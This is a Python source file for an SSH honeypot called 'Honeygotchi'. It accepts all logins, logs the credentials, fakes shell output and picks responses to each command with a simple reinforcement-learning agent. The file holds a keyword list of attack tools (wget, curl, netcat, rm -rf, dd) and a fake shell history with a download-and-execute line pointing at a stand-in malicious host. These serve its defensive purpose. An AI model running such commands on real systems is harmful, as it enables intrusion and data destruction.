import asyncio
import asyncssh
import json
import logging
import random
import time
import uuid
from datetime import datetime
from prometheus_client import Counter, Histogram, Gauge, start_http_server
from typing import Dict, Any

SESSIONS_TOTAL = Counter('honeygotchi_sessions_total', 'Total SSH sessions', ['client_ip'])
COMMANDS_TOTAL = Counter('honeygotchi_commands_total', 'Total commands executed', ['action', 'is_malicious'])
SESSION_DURATION = Histogram('honeygotchi_session_duration_seconds', 'Session duration')
ACTIVE_SESSIONS = Gauge('honeygotchi_active_sessions', 'Currently active sessions')
RL_ACTIONS = Counter('honeygotchi_rl_actions_total', 'RL actions taken', ['action'])

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s %(levelname)s %(message)s',
    handlers=[
        logging.FileHandler('/app/logs/honeygotchi.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class SimpleRLAgent:
    def __init__(self):
        self.actions = ['ALLOW', 'DELAY', 'FAKE', 'INSULT', 'BLOCK']
        self.action_rewards = {action: 0.0 for action in self.actions}
        self.action_counts = {action: 0 for action in self.actions}
        self.epsilon = 0.3
        
    def select_action(self, command: str, session_info: Dict[str, Any]) -> str:
        is_malicious = self._is_malicious(command)
        
        if random.random() < self.epsilon:
            action = random.choice(self.actions)
        else:
            if is_malicious:
                action = random.choice(['FAKE', 'INSULT', 'DELAY', 'BLOCK'])
            else:
                action = random.choice(['ALLOW', 'ALLOW', 'DELAY'])
        
        RL_ACTIONS.labels(action=action).inc()
        self.action_counts[action] += 1
        
        return action
    
    def _is_malicious(self, command: str) -> bool:
        malicious_patterns = [
            'wget', 'curl', 'nc', 'netcat', 'python -c', 'bash -c',
            'base64', 'chmod +x', '/tmp/', 'rm -rf', 'dd if='
        ]
        return any(pattern in command.lower() for pattern in malicious_patterns)
    
    def update_reward(self, action: str, reward: float):
        if action in self.action_rewards:
            count = self.action_counts[action]
            if count > 0:
                old_avg = self.action_rewards[action]
                self.action_rewards[action] = old_avg + (reward - old_avg) / count

class CommandProcessor:
    def __init__(self):
        self.current_dir = "/home/user"
        self.fake_files = {
            "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000:user:/home/user:/bin/bash\n",
            "/home/user/.bash_history": "ls\ncd /tmp\nwget http://malicious.com/script.sh\nchmod +x script.sh\n"
        }
    
    async def process_command(self, command: str, action: str) -> str:
        if action == 'ALLOW':
            return await self._execute_normal(command)
        elif action == 'DELAY':
            await asyncio.sleep(2)
            return await self._execute_normal(command)
        elif action == 'FAKE':
            return self._generate_fake_response(command)
        elif action == 'INSULT':
            return self._generate_insult()
        elif action == 'BLOCK':
            return "Connection terminated.\n"
        else:
            return await self._execute_normal(command)
    
    async def _execute_normal(self, command: str) -> str:
        parts = command.strip().split()
        if not parts:
            return ""
        
        cmd = parts[0].lower()
        
        if cmd == 'ls':
            return "documents  downloads  .bash_history  .bashrc\n"
        elif cmd == 'pwd':
            return f"{self.current_dir}\n"
        elif cmd == 'whoami':
            return "user\n"
        elif cmd == 'cat':
            if len(parts) > 1:
                file_path = parts[1]
                if file_path in self.fake_files:
                    return self.fake_files[file_path]
                else:
                    return f"cat: {file_path}: No such file or directory\n"
            return "cat: missing file operand\n"
        elif cmd == 'uname':
            return "Linux honeypot 5.4.0-generic x86_64 GNU/Linux\n"
        elif cmd in ['wget', 'curl']:
            return f"Connecting to server...\nDownload completed.\n"
        else:
            return f"{cmd}: command not found\n"
    
    def _generate_fake_response(self, command: str) -> str:
        if 'wget' in command or 'curl' in command:
            return "HTTP request sent, awaiting response... 200 OK\nLength: 2048 (2.0K)\nSaving to: 'malware.sh'\nmalware.sh saved [2048/2048]\n"
        elif 'chmod' in command:
            return ""
        elif 'python' in command:
            return "Script executed successfully.\nProcess completed.\n"
        else:
            return f"Command executed: {command}\n"
    
    def _generate_insult(self) -> str:
        insults = [
            "Nice try, script kiddie! Your attacks are pathetic.",
            "Is that the best you can do? My grandmother codes better exploits.",
            "Access denied! Your IP has been reported to authorities.",
            "Seriously? Go back to hacking school.",
            "Your weak attempts are laughable. Try harder next time."
        ]
        return random.choice(insults) + "\n"

class HoneygotchiSSHSession(asyncssh.SSHServerSession):
    def __init__(self, rl_agent: SimpleRLAgent, command_processor: CommandProcessor):
        self.rl_agent = rl_agent
        self.command_processor = command_processor
        self.session_id = str(uuid.uuid4())
        self.client_ip = None
        self.start_time = time.time()
        self.command_count = 0
        
        ACTIVE_SESSIONS.inc()
        
    def connection_made(self, chan):
        self.chan = chan
        self.client_ip = chan.get_extra_info('peername')[0]
        
        logger.info(json.dumps({
            "event": "session_start",
            "session_id": self.session_id,
            "client_ip": self.client_ip,
            "timestamp": datetime.now().isoformat()
        }))
        
        SESSIONS_TOTAL.labels(client_ip=self.client_ip).inc()
    
    def shell_requested(self):
        return True
    
    def session_started(self):
        self.chan.write("Welcome to Ubuntu 20.04 LTS\n")
        self.chan.write("Last login: Mon Jan 15 10:30:22 2024\n")
        self._send_prompt()
    
    def data_received(self, data, datatype):
        """Handle received data - FIXED VERSION."""
        try:
            command = data.strip()
            if command:
                asyncio.create_task(self._process_command(command))
        except Exception as e:
            logger.warning(f"Error processing data from {self.client_ip}: {e}")
    
    async def _process_command(self, command: str):
        try:
            self.command_count += 1
            
            session_info = {
                'client_ip': self.client_ip,
                'session_id': self.session_id,
                'command_count': self.command_count
            }
            
            action = self.rl_agent.select_action(command, session_info)
            is_malicious = self.rl_agent._is_malicious(command)
            
            logger.info(json.dumps({
                "event": "command_executed",
                "session_id": self.session_id,
                "client_ip": self.client_ip,
                "command": command,
                "action": action,
                "is_malicious": is_malicious,
                "timestamp": datetime.now().isoformat()
            }))
            
            COMMANDS_TOTAL.labels(action=action, is_malicious=str(is_malicious)).inc()
            
            response = await self.command_processor.process_command(command, action)
            
            if response and action != 'BLOCK':
                self.chan.write(response)
                self._send_prompt()
            elif action == 'BLOCK':
                self.chan.write(response)
                self.chan.close()
                return
            else:
                self._send_prompt()
            
            reward = 1.0 if is_malicious and action in ['FAKE', 'INSULT', 'DELAY'] else 0.5
            self.rl_agent.update_reward(action, reward)
            
        except Exception as e:
            logger.error(f"Error processing command '{command}': {e}")
            try:
                self.chan.write(f"Error processing command\n")
                self._send_prompt()
            except:
                self.chan.close()
    
    def _send_prompt(self):
        self.chan.write(f"user@honeypot:{self.command_processor.current_dir}$ ")
    
    def connection_lost(self, exc):
        duration = time.time() - self.start_time
        
        logger.info(json.dumps({
            "event": "session_end",
            "session_id": self.session_id,
            "client_ip": self.client_ip,
            "duration": duration,
            "commands_executed": self.command_count,
            "timestamp": datetime.now().isoformat()
        }))
        
        SESSION_DURATION.observe(duration)
        ACTIVE_SESSIONS.dec()

class HoneygotchiSSHServer(asyncssh.SSHServer):
    def __init__(self):
        self.rl_agent = SimpleRLAgent()
        self.command_processor = CommandProcessor()
    
    def connection_made(self, conn):
        client_ip = conn.get_extra_info('peername')[0]
        logger.info(f"New connection from {client_ip}")
    
    def begin_auth(self, username):
        return True
    
    def password_auth_supported(self):
        return True
    
    def validate_password(self, username, password):
        logger.info(json.dumps({
            "event": "login_attempt",
            "username": username,
            "password": password,
            "timestamp": datetime.now().isoformat()
        }))
        return True
    
    def session_requested(self):
        return HoneygotchiSSHSession(self.rl_agent, self.command_processor)

async def main():
    logger.info("Starting Honeygotchi...")
    
    start_http_server(9090)
    logger.info("Prometheus metrics server started on port 9090")
    
    try:
        server = await asyncssh.listen(
            host='0.0.0.0',
            port=2222,
            server_factory=HoneygotchiSSHServer,
            server_host_keys=['ssh_host_key']
        )
        
        logger.info("SSH honeypot started on port 2222")
        logger.info("Honeygotchi is ready!")
        
        await server.wait_closed()
        
    except Exception as e:
        logger.error(f"Failed to start SSH server: {e}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Honeygotchi stopped")